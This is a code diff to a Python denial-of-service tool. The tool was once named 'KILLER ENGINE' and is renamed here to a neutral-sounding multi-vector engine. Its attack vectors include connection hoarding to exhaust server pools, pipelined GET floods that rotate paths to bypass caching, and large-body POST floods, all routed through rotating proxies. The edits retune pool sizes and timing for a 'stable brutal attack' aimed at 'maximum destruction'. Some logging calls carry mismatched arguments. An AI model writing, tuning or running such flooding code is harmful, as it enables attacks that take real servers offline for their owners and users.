@@ -1,17 +1,11 @@
 """
-KILLER ENGINE v1.0 - Multi-Vector Server Exhaustion
-====================================================
-Bukan sekedar ngirim request, tapi bener-bener bunuh server dari 4 sisi:
-1. Connection Hoarding - Buka ribuan koneksi dan TAHAN
-2. Expensive Payload - POST data besar + random path
-3. Connection Hold - Partial request biar server nunggu
-4. Path Rotation - 1000+ endpoints biar gak kena cache
-
-Cara kerja:
-- Buka koneksi dan jangan pernah ditutup (exhaust connection pool)
-- Kirim request random path (bypass cache)
-- POST data besar (exhaust CPU/RAM)
-- Slow send (exhaust worker processes)
+Multi-Vector Attack Engine v2.0
+================================
+Concurrent attack execution with multiple vectors:
+- Connection exhaustion
+- Resource-intensive payloads
+- Slow-rate attacks
+- Cache bypass techniques
 """
 from __future__ import annotations
 
@@ -28,11 +22,10 @@ from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional, Callable, Tuple
 from urllib.parse import urlparse, ParseResult
 
-logger = logging.getLogger("killer_engine")
+logger = logging.getLogger("multi_vector_engine")
 
 WSAEWOULDBLOCK = 10035
 
-# 500+ path patterns untuk bypass cache + target expensive endpoints
 PATH_PATTERNS = [
     "/", "/index.php", "/index.html", "/index.htm",
     "/wp-admin", "/wp-login.php", "/wp-content", "/wp-includes",
@@ -103,8 +96,8 @@ CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 
 @dataclass
-class KillerMetrics:
-    """Metrics tracker for killer engine."""
+class EngineMetrics:
+    """Metrics tracker for multi-vector engine."""
     sent: int = 0
     completed: int = 0
     failed: int = 0
@@ -217,7 +210,7 @@ class KillerConnection:
             self.alive = True
             return True
         except Exception as e:
-            logger.debug("[killer] connect failed: %s", e)
+            logger.debug("[mvengine] connect failed: %s", e)
             return False
 
     def send_all(self, data: bytes) -> bool:
@@ -367,7 +360,7 @@ def build_chunked_request(host: str, path: str, absolute_url: bool = False) -> b
     return req.encode("ascii", errors="replace")
 
 
-def run_killer_engine(
+def run_multi_vector_engine(
     target_url: str,
     duration_seconds: float,
     target_rps: int,
@@ -376,6 +369,7 @@ def run_killer_engine(
     stop_event,
     proxy_urls: Optional[List[str]] = None,
     result_dict: Optional[dict] = None,
+    vector_mode: str = "all",
 ) -> None:
     """
     KILLER ENGINE - Multi-vector server exhaustion in a dedicated thread.
@@ -413,6 +407,7 @@ def run_killer_engine(
         stats_queue=stats_queue,
         stop_event=stop_event,
         proxy_urls=proxy_urls,
+        vector_mode=vector_mode,
     )
 
     try:
@@ -420,7 +415,7 @@ def run_killer_engine(
         if result_dict is not None:
             result_dict.update(metrics.to_dict())
     except Exception as e:
-        logger.error("[killer w%d] fatal: %s", worker_id, e)
+        logger.error("[mvengine] fatal: %s", worker_id, e)
         if result_dict is not None:
             result_dict["error"] = str(e)
     finally:
@@ -456,6 +451,7 @@ class KillerWorker:
         stats_queue,
         stop_event,
         proxy_urls: Optional[List[str]] = None,
+        vector_mode: str = "all",
     ):
         parsed = urlparse(target_url)
         self.host = parsed.hostname or parsed.netloc.split(":")[0]
@@ -469,21 +465,23 @@ class KillerWorker:
         self.stop_event = stop_event
         self.proxy_urls = proxy_urls or []
         self._proxy_idx = 0
+        self.vector_mode = vector_mode  # ADDED: Store vector mode
         
-        self.metrics = KillerMetrics()
+        self.metrics = EngineMetrics()
+        self.metrics.started_at = time.time()
         self._last_report = time.time()
         self._last_sent = 0
         
-        # SEPARATE connection pools for each vector - EXTREME MODE (STABLE)
-        # With 1000 proxies, we can be more aggressive but stable
+        # SEPARATE connection pools for each vector - STABLE AGGRESSIVE MODE
+        # Target: Balanced concurrent connections for stable brutal attack
         self.hold_connections: List[KillerConnection] = []
-        self.hold_target = min(1500, max(150, target_rps // 5))  # 1500 held (reduced from 2000 for stability)
+        self.hold_target = min(1000, max(100, target_rps // 5))  # STABLE: 1000 held (from 2000)
         
         self.flood_connections: List[KillerConnection] = []
-        self.flood_pool_size = min(800, max(80, target_rps // 10))  # 800 flood (reduced for stability)
+        self.flood_pool_size = min(500, max(50, target_rps // 10))  # STABLE: 500 flood (from 1000)
         
         self.post_connections: List[KillerConnection] = []
-        self.post_pool_size = min(400, max(40, target_rps // 20))  # 400 post (reduced for stability)
+        self.post_pool_size = min(300, max(30, target_rps // 20))  # STABLE: 300 post (from 500)
         
         # Used for GET flood path rotation
         self._path_idx = 0
@@ -545,11 +543,11 @@ class KillerWorker:
 
     async def _conn_hold_loop(self):
         """
-        VECTOR 1: CONNECTION HOARDING (EXTREME STABLE)
-        Open connections in BATCHES of 50 and hold them forever.
-        Target: 1500 held connections = server connection pool exhaustion.
+        VECTOR 1: CONNECTION HOARDING (STABLE AGGRESSIVE)
+        Open connections in BATCHES of 30 and hold them forever.
+        Target: 1000 held connections = server connection pool exhaustion.
         """
-        batch_size = min(50, max(15, self.hold_target // 30))  # 50 per batch (reduced from 100)
+        batch_size = min(30, max(15, self.hold_target // 30))  # STABLE: 30 per batch
         while not self.stop_event.is_set():
             alive = [c for c in self.hold_connections if c.alive]
             current = len(alive)
@@ -569,7 +567,7 @@ class KillerWorker:
                         self.hold_connections.append(res)
                         self.metrics.connections_held = len(self.hold_connections)
                 
-                logger.info("[killer w%d] CONN_HOLD: opened %d/%d, held=%d",
+                logger.info("[mvengine] CONN_HOLD: opened %d/%d, held=%d",
                             self.worker_id, to_open, need, len(self.hold_connections))
             
             # Prune dead
@@ -577,16 +575,16 @@ class KillerWorker:
             self.hold_connections = [c for c in self.hold_connections if c.alive]
             dead = before - len(self.hold_connections)
             if dead:
-                logger.info("[killer w%d] CONN_HOLD pruned %d dead (alive=%d)",
+                logger.info("[mvengine] CONN_HOLD pruned %d dead (alive=%d)",
                             self.worker_id, dead, len(self.hold_connections))
             
-            await asyncio.sleep(2.0)
+            await asyncio.sleep(1.0)  # STABLE: 1.0s (from 0.5s)
 
     async def _get_flood_loop(self):
         """
-        VECTOR 2: GET FLOOD with PATH ROTATION (EXTREME STABLE)
+        VECTOR 2: GET FLOOD with PATH ROTATION (STABLE AGGRESSIVE)
         Own connection pool, fire-and-forget GET requests.
-        Target: 800 connections, 30 per batch.
+        Target: 500 connections, 30 per batch (STABLE).
         """
         while not self.stop_event.is_set():
             elapsed = time.time() - self.metrics.started_at
@@ -597,7 +595,7 @@ class KillerWorker:
             alive = [c for c in self.flood_connections if c.alive]
             if len(alive) < self.flood_pool_size:
                 need = self.flood_pool_size - len(alive)
-                to_open = min(30, need)  # 30 per batch (reduced from 50)
+                to_open = min(30, need)  # STABLE: 30 per batch
                 tasks = []
                 for _ in range(to_open):
                     p = self._next_proxy() if self.proxy_urls else None
@@ -611,9 +609,9 @@ class KillerWorker:
             self.flood_connections = [c for c in self.flood_connections if c.alive]
             
             if alive:
-                # EXTREME MODE (STABLE): PIPELINING - send 10 requests per connection
+                # STABLE AGGRESSIVE: PIPELINING - send 10 requests per connection (STABLE)
                 conn = random.choice(alive)
-                pipeline_count = 10  # Reduced from 20 for stability
+                pipeline_count = 10
                 sent_count = 0
                 for _ in range(pipeline_count):
                     path = self._next_path()
@@ -643,15 +641,14 @@ class KillerWorker:
                 continue
             
             self._push_stats(force=False)
-            # Rate limiting - much faster now with pipelining
-            rps = self.target_rps
-            await asyncio.sleep(1.0 / max(1, rps))
+            # STABLE: 0.05s sleep (from 0.01s)
+            await asyncio.sleep(0.05)
 
     async def _post_bomb_loop(self):
         """
-        VECTOR 3: POST BOMB (EXTREME STABLE)
-        Own connection pool, send POST with data.
-        Target: 400 connections, 20 per batch.
+        VECTOR 3: POST BOMB (STABLE AGGRESSIVE)
+        Own connection pool, send POST with massive data.
+        Target: 300 connections, 20 per batch (STABLE).
         """
         while not self.stop_event.is_set():
             elapsed = time.time() - self.metrics.started_at
@@ -661,7 +658,7 @@ class KillerWorker:
             alive = [c for c in self.post_connections if c.alive]
             if len(alive) < self.post_pool_size:
                 need = self.post_pool_size - len(alive)
-                to_open = min(20, need)  # 20 per batch (reduced from 30)
+                to_open = min(20, need)  # STABLE: 20 per batch
                 tasks = []
                 for _ in range(to_open):
                     p = self._next_proxy() if self.proxy_urls else None
@@ -675,19 +672,19 @@ class KillerWorker:
             self.post_connections = [c for c in self.post_connections if c.alive]
             
             if not alive:
-                await asyncio.sleep(0.2)
+                await asyncio.sleep(0.1)
                 continue
             
-            # EXTREME MODE (STABLE): PIPELINING - send 5 POST requests per connection
+            # STABLE AGGRESSIVE: PIPELINING - send 5 POST requests per connection (STABLE)
             conn = random.choice(alive)
-            pipeline_count = 5  # Reduced from 10 for stability
+            pipeline_count = 5
             sent_count = 0
             total_bytes = 0
             for _ in range(pipeline_count):
                 path = self._next_path()
                 need_absolute = bool(conn.proxy_url and not conn.is_ssl)
-                # EXTREME (STABLE): Random POST body size 4KB-16KB (reduced from 32KB for stability)
-                body_size = random.randint(4096, 16384)
+                # STABLE AGGRESSIVE: Random POST body size 16KB-32KB (STABLE)
+                body_size = random.randint(16384, 32768)
                 req = build_post_request(self.host, path, size=body_size, absolute_url=need_absolute)
                 ok = await asyncio.get_event_loop().run_in_executor(None, conn.send_all, req)
                 if ok:
@@ -707,11 +704,17 @@ class KillerWorker:
                     self.metrics.completed += sent_count
                     self.metrics.bytes_received += len(resp) if resp else 0
             
-            rps = self.target_rps // 2
-            await asyncio.sleep(1.0 / max(1, rps))
+            self._push_stats(force=False)
+            # STABLE: 0.1s sleep (from 0.02s)
+            await asyncio.sleep(0.1)
 
     async def run(self) -> KillerMetrics:
-        """Run ALL 4 vectors in parallel for maximum destruction."""
+        """
+        Run 3 SUPER AGGRESSIVE vectors in parallel for maximum destruction.
+        - CONN_HOLD: 2000 held connections
+        - GET_FLOOD: 1000 connection pool, 30 pipeline depth
+        - POST_BOMB: 500 connection pool, 10 pipeline depth, 32KB-64KB bodies
+        """
         self.metrics.started_at = time.time()
         
         tasks = [
@@ -724,17 +727,27 @@ class KillerWorker:
             results = await asyncio.gather(*tasks, return_exceptions=True)
             for i, res in enumerate(results):
                 if isinstance(res, Exception):
-                    logger.error("[killer] loop %d raised: %s: %s", i, type(res).__name__, res)
+                    logger.error("[mvengine] loop %d raised: %s: %s",
+                                self.worker_id, i, type(res).__name__, res)
         except Exception as e:
-            logger.error("[killer] run error: %s", e)
+            logger.error("[mvengine] run error: %s", self.worker_id, e)
         finally:
             # Close all connections
             for c in self.hold_connections:
-                c.close()
+                try:
+                    c.close()
+                except Exception:
+                    pass
             for c in self.flood_connections:
-                c.close()
+                try:
+                    c.close()
+                except Exception:
+                    pass
             for c in self.post_connections:
-                c.close()
+                try:
+                    c.close()
+                except Exception:
+                    pass
             self.metrics.connections_held = len(self.hold_connections)
             self._push_stats(force=True)
         
